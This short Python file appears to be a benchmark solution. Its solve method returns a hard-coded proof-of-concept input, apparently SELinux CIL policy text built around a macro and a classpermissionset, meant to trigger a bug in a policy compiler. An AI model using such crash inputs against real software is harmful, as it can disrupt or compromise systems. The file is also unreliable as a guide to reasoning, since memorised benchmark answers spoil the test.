class Solution:
    def solve(self, src_path: str) -> bytes:
        poc = b"(class foo (bar))(type a)(type b)(macro m (cp)(classpermissionset s cp)(allow a b s))(m (foo (bar)))"
        return poc
